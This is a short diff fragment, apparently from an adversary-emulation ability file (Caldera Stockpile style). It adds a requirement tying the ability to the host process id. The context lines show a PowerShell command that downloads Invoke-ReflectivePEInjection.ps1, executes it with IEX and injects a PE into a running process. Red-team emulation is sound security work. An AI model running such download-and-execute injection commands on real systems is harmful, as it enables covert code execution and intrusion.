@@ -23,3 +23,6 @@
           $wc1.headers.add("file","Invoke-ReflectivePEInjection.ps1");
           IEX ($wc1.DownloadString($url));
           Invoke-ReflectivePEInjection -verbose -PBytes $PEbytes -ProcId #{host.process.id}
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+      - source: host.process.id
